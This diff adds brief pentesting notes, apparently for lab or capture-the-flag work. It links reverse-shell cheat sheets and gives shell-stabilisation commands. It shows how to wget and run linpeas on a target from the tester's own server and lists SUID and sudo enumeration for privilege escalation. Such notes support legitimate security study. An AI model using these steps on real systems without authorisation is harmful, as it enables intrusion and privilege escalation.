@@ -1,0 +1,31 @@
+Cheat Sheet:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?source=post_page-----fe099ba949bc---------------------------------------
+
+Stabilize Reverse Shell:
+python -c 'import pty; pty.spawn("/bin/bash")'
+Step 1: python3 -c 'import pty;pty.spawn("/bin/bash")'  
+Step 2: CTRL + Z  
+Step 3: stty raw -echo; fg  
+Step 4: export TERM=xterm
+
+LHOST:
+ip addr
+
+**IF PYTHON SCRIPT IS MISSING MODULE**
+1. python3 -m venv venv
+2. source venv/bin/activate
+3. pip install module
+4. Run script again
+
+**Linpeas Transfer Instructions**
+1. On local machine: make sure linpeas is in the folder you're using and start up local server
+  python3 -m http.server <port>
+2. On target machine:
+  wget http://<tun0 ip>:<port>/linpeas.sh
+3. Now let's chmod +x and use it ./linpeas.sh
+
+**Binaries without linpeas:**
+sudo -l
+find . -perm /4000
+find / -type f -perm -u=s 2>/dev/null
